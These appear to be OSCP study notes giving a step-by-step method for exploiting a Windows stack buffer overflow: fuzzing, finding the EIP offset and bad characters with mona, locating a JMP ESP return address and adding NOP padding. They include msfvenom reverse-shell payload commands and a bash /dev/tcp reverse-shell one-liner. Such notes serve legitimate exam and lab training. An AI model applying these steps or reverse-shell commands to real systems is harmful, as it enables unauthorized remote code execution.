# methodology

**NOTE: for OSCP prep, you can skip the `METHOD_1: SPIKING` section**

1. Run Immunity debugger as administrator
2. Attach the vulnerable service to Immunity debugger
3. Configure Mona working folder using `!mona config -set workingfolder c:\kashz`

## METHOD 1: Spiking (finding the crash)

* [https://www.kali.org/tools/spike/](https://www.kali.org/tools/spike/)
* [https://resources.infosecinstitute.com/topic/intro-to-fuzzing/](https://resources.infosecinstitute.com/topic/intro-to-fuzzing/)

**NOTE:** there could be multiple buffers in the vulnerable service, we need to confirm which buffer is vulnerable.

* `./generic_send_tcp IP PORT SPIKE_SCRIPT SKIPVAR SKIPSTR`
    * use `SKIPVAR=0 SKIPSTR=0` to fuzz from beginning.

### file: spike_script_example.spk

```bash
s_readline();
s_string("to-send-something? ");
s_string_variable("0");
```

## METHOD 2: Spiking (finding the crash)

**NOTE:** you can modify the `fuzzer.py` to send a specific number of bytes and confirm crash.

1. Run `fuzzer.py` and note the crash byte number

## Finding OFFSET and EIP

1. Generate pattern 400 bytes more than crash using msf: `msf-pattern_create -l <number>`
2. set `PAYLOAD = <generated-alue>`
3. Run `exploit.py` and find offset
    1. Using mona: `!mona findmsp -distance <EIP>`. Should show in log windows
       as `EIP contains normal pattern : 0x6f43396e (offset 1978)`
    2. [OR] using msf: `msf-pattern_offset -l <number> -q <EIP>`
4. set `OFFSET = value`, set `PAYLOAD = ""`, set `RETURN = iiii` value of 0x69696969.
5. Run `exploit.py`
6. Program (should) crash with EIP = 69696969

## Finding BadChars using !mona

1. Generate byte-array using mona excluding the `\x00` null byte using `!mona bytearray -cpb "\x00"`
2. set `PAYLOAD = ( generated-byte-array )`
3. Run `exploit.py`
4. Note ESP and find barChar using `!mona compare -f C:\kashz\bytearray.bin -a <ESP_address>`
5. Remove 1st badChar from mona byte-array and generate new `!mona bytearray -cpb "\x00\xXX"`
6. Remove the badChar from `PAYLOAD` in `exploit.py`
7. Continue steps 3-6 until mona memory corruption log output says `STATUS = UNMODIFIED`

## Finding JMP using !mona

Note: **ALL badChars** are needed to find the JMP instruction.

1. Locate all JMP ESP using `!mona jmp -r esp -cpb "\x00\xXX"`
2. Select the one, for which ASLR and other security protections are FALSE.
3. Windows requires little endian style. So,
    1. if JMP instruction is  `0x12345678`.
    2. Take 2 letter from right-to-left and form return address
    3. return address is `\x78\x56\x34\x12`
    4. set `RETN = \x78\x56\x34\x12` in `exploit.py`

## Generate msfvenom Payload

```bash
msfvenom -p windows/shell_reverse_tcp LHOST= LPORT= EXITFUNC=thread -b "badChars" -f c
msfvenom -p linux/x86/shell_reverse_tcp LHOST= LPORT= EXITFUNC=thread -b "badChars" -f c

# windows under linux (wine)
bash -i >& /dev/tcp/IP/PORT 0>&1
```

set `PAYLOAD = ( payload )`

## Prepend NOPs (\x90)

**NOTE: try `32` if `16` does not work.**

Usually an encoder will be used to generate the msfvenom payload which requires memory space to unpack.
set `PADDING = "\x90" * 16` in `exploit.py`

# Manual Process

## Finding BadChars manually

If by any chance, mona is adding new badChars after every removal of possible badChar, time to do it manually. Follow
the same process but instead of mona to check for badChar use the following method.

1. (top-menu option) View > CPU window > (top right register pane) right-click ESP > follow dump
2. (bottom left hexdump pane) same CPU windows - see all bad chars in line
3. read thoroughly and check if all byte-array-chars are in order.
    1. If any char is skipped or missing - it is a badChar
    2. If byte-array-chars are missing after a specific char - that is a badChar
    3. Remove one char at a time until you reach the last \0xff.

## Finding JMP manually

Note: **ALL badChars** are needed to find the JMP instruction.

1. view > CPU window
2. (top left pane) right click > Search for > All Commands in all modules > JMP ESP > search
3. Choose JMP Address with Green color and module name (as the file running)
4. Follow the above process to create little endian style return address

**[OR]**

1. use `!mona modules`.
    1. Find a module that is being loaded with protection settings as `False.`
    2. use `!mona find -s "\xff\xe4" -m MODULE_NAME`
        1. **JMP ESP == FFE4 (in assembly)**